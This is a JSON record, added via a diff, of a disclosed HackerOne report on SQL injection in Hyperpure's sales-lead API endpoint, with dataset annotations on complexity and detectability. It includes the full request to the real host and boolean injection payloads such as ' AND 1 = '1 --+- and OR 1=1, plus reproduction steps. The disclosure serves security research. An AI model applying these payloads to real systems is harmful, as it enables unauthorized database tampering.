@@ -1,0 +1,42 @@
+{
+    "reported_to": "Zomato",
+    "reported_by": "hoteyes ",
+    "title": "SQL Injection in www.hyperpure.com",
+    "content": "\nVulnerable Request :\nPUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc HTTP/1.1\nHost: api.hyperpure.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json, text/plain, /\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nX-Client: consumer\nX-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a\nHeaderRoute: v2\nAPIVersion: 4.2\nAppType: web\nContent-Length: 246\nOrigin: https://www.hyperpure.com\nConnection: close\nReferer: https://www.hyperpure.com/register\n{\"address\":{\"addressLine\":\"test\",\"cityId\":34,\"state\":{\"name\":\"Gujarat\"},\"zipCode\":\"388001\"},\"deliveryTime\":0,\"email\":\"hoteyes@wearehackerone.com\",\"outletName\":\"test\",\"phoneNumber\":\"\u2588\u2588\u2588\u2588\u2588\",\"salesLeadId\":\"31cf8eb0-f81e-4c99-acad-35eae89ed659\"}\nThe above request is used to create sales lead with the data the sales lead id is produced and verified by the domain.\nBase Response Received:\nHTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nContent-Length: 68\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: https://www.hyperpure.com\nx-envoy-upstream-service-time: 166\nServer: envoy\nDate: Thu, 26 Nov 2020 18:48:34 GMT\nConnection: close\nVary: Accept-Encoding\n{\"response\":{\"salesLeadId\":\"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\"}}\nNow we will be executing following steps to verify if \"AND \" & \"OR\" statements work.\n1) Proving AND condition working while using it with a valid sales id \" AND 1 = \"1 --+-\n\n2) Proving AND condition false with working sales lead using AND 1=0.\n3) Proving adding cool as a sales lead by using OR 1=1 , which always states true.\nImpact\nAdding random sales ID in the database using PUT statement and populating it.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 2000,
+    "weaknesses": [
+        "Code Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1613997240,
+    "report_url": "https://hackerone.com/reports/1044716",
+    "vuln_category": "API",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "steps": [
+        [
+            1,
+            "Send a PUT request to /consumer/onboarding/saleslead/ with a valid salesLeadId and inject SQL using AND 1=1 --+- in one of the fields"
+        ],
+        [
+            2,
+            "Observe the response to confirm the SQL injection is successful by checking if the query condition affects the output"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a classic SQL injection in the sales lead creation endpoint of hyperpure.com. By injecting SQL conditions (AND/OR) into the request parameters, an attacker can manipulate database queries, potentially adding unauthorized sales leads or extracting data.",
+    "reason": "This is a straightforward SQL injection vulnerability with no complex application states or novel logic required. The attack follows standard SQL injection techniques using basic boolean conditions (AND/OR) that are well-documented and commonly tested for in web applications.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating the input data (salesLeadId) to execute arbitrary SQL commands. This is not directly related to authentication or authorization bypass but rather to input validation and database query manipulation. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to SQL injection detection.",
+        "is_detectable": false
+    }
+}
